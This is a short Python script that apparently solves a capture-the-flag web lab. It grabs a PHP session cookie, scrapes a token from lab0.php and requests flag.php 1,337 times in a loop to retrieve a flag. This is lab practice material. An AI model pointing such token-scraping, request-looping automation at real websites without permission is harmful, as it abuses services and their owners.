import requests
import tqdm
import re

site = "http://pumpk1n.com/"
lab0_suffix = "lab0.php"
flag_suffix = "flag.php"

# first access : get cookie
r = requests.get(site + lab0_suffix)
assert(r.status_code == 200)
cookie = r.cookies['PHPSESSID']
cookie_data = f'PHPSESSID={cookie}'
print(f"get very first cookie: {cookie_data}")

def get_token_from_data(data:str):
    pattern = '/flag.php?token='
    s = data.find(pattern)
    return data[s + len(pattern) : s + len(pattern) + 16]

token_data = get_token_from_data(r.text)
print(f"get very first token :{token_data}")

for i in tqdm.tqdm(range(1337)):
    # access flag.php
    r = requests.get(site + flag_suffix + f'?token={token_data}',headers = {'Cookie':cookie_data})
    #DEBUG print(r.text)
    # get next token
    r = requests.get(site + lab0_suffix,headers = {'Cookie':cookie_data})
    token_data = get_token_from_data(r.text)

r = requests.get(site + flag_suffix + f'?token={token_data}',headers = {'Cookie':cookie_data})
print(r.text)